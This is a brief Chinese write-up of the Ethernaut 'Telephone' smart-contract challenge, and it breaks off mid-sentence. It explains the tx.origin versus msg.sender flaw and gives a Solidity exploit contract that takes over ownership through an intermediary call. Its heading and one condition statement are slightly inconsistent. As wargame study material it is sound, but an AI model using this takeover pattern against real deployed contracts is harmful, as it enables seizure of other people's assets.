# 0 - Hello Ethernaut writeup

## 题目
[Telephone](https://ethernaut.openzeppelin.com)

## 笔记
首先注意到只有在 tx.origin != msg.sender 时，能够获得拥有权，如果我以自己的钱包直接调用 changeowner 函数，无法得到 tx.origin 与 
msg.sender 相等的条件，但如果我写一个合约调用 changeowner 函数，而以钱包调用这个合约，就可以满足要求，于是合约如下
```
   pragma solidity ^0.8.0;

import "Ethernaut/Telephone/Telephone.sol";

contract hack_Telephone {
    Telephone telephone;
    constructor(address telephone_address) {
        telephone = Telephone(telephone_address);
    }

    function  hack_changeowner() public {
        telephone.changeOwner(msg.sender);
    }

}
```

通过 remix 部署上述合约，在部署时填入题目合约的地址即可成功部署，随后调用